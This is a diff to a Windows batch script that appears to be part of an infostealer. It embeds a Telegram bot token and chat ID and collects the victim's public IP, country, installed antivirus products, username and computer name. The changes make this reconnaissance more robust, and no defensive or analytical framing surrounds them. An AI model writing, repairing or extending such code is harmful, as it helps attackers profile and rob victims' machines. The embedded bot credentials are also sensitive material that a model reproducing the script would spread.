@@ -25,8 +25,8 @@ setlocal EnableDelayedExpansion
 set "TOKEN=7604003483:AAGGIo6lbNlshSjnvsG1w7OmBjLBc4r55FA"
 set "CHAT_ID=5674938532"
 
-for /f "tokens=*" %a in ('powershell -NoProfile -Command "try { $json = Invoke-RestMethod -Uri ''http://ip-api.com/json/''; Write-Host ($json.query + ''|'' + $json.country) } catch { Write-Host ''Error|Error'' }"') do (
-    for /f "tokens=1,2 delims=|" %b %c in ("%a") do (
+for /f "tokens=*" %a in ('powershell -NoProfile -Command "try { $json = Invoke-RestMethod -Uri 'http://ip-api.com/json/'; Write-Host ($json.query + '|' + $json.country) } catch { Write-Host 'Error|Error' }"') do (
+    for /f "tokens=1,2 delims=|" %b in ("%a") do (
         set "IP=%b"
         set "Country=%c"
     )
@@ -46,7 +46,14 @@ for /f "tokens=*" %a in ('powershell -NoProfile -Command "[System.Environment]::
     )
 )
 
-for /f "tokens=*" %a in ('powershell -command "(Get-CimInstance  -Namespace root/SecurityCenter2 -Class AntiVirusProduct).displayName"') do (if defined Antivirus (set "Antivirus=!Antivirus!,%a") else (set "Antivirus=%a"))
+set "Antivirus=No Antivirus"
+for /f "tokens=*" %a in ('powershell -NoProfile -Command "try { (Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct).displayName } catch { Write-Host 'No Antivirus' }"') do (
+    if "%Antivirus%"=="No Antivirus" (
+        set "Antivirus=%a"
+    ) else (
+        set "Antivirus=%Antivirus%, %a"
+    )
+)
 
 set "UserName=%USERNAME%"
 set "Worker=%COMPUTERNAME%"
